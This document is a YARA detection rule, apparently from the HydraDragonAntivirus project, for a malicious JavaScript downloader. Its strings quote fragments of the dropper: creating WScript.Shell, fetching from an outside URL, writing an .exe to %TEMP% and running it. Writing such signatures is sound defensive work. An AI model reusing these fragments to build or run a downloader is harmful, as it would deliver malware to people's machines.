rule sig_20160328_6cf47a7244a8a243e5ea8cc516d35a4f {
  meta:
    description = "datamaliciousorder - file 20160328_6cf47a7244a8a243e5ea8cc516d35a4f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b8b59d887bcd27c016f7e5d059de8e39fd5ab28ccdc14b7a161f64fdd3cd406b"

  strings:
    $s1  = "function Jpqjtpnz() {return Tsgpfdwo[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"geaJowb3.exe\";};" fullword ascii
    $s2  = "do {WScript[Jxvcnmchh](Cysbjdou() * 11)} while (Nvdsidumrf[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "Nvdsidumrf[Thvhwxlasb](\"GET\", \"http://www.qubefurniture.co.uk/lsd3ka\", false);" fullword ascii
    $s4  = "function Dpicuk(Etnfnxw, Qhekb){return Etnfnxw - Qhekb;};" fullword ascii
    $s5  = "var Tsgpfdwo = function Fycol() {return WScript[Mzcgo](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Dnrqyto() {return ((Xenzhv == true) && (Xenzhv == Ownlo)) ? 1 : Jpwnc;};" fullword ascii
    $s7  = "function Frjcyjuod(Axzypfa){Tsgpfdwo[\"Run\"](Axzypfa, Jpwnc, Jpwnc);};" fullword ascii
    $s8  = "var Vemclgjfak = new this[\"Date\"]();" fullword ascii
    $s9  = " while (Xynetqcvm){" fullword ascii
    $s10 = "return Dpicuk(Czlbro, Mfswhgdz);" fullword ascii
    $s11 = "var Ownlo = false;" fullword ascii
    $s12 = "function Ontqwoijj(Syoyhig) {var Ezuda = (1, 2, 3, 4, 5, Syoyhig); return Ezuda;};" fullword ascii
    $s13 = "function Cysbjdou(){return 22;};" fullword ascii
    $s14 = "var Bximqlxlnh = false;" fullword ascii
    $s15 = "function Adphdstar(){return Dhcsjwmbv;};" fullword ascii
    $s16 = "function Wgilsazz()" fullword ascii
    $s17 = "function Xsoxqohwvk(){return Mzcgo;};" fullword ascii
    $s18 = "Ownlo = true; " fullword ascii
    $s19 = "Xenzhv = true; " fullword ascii
    $s20 = "var Xenzhv = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}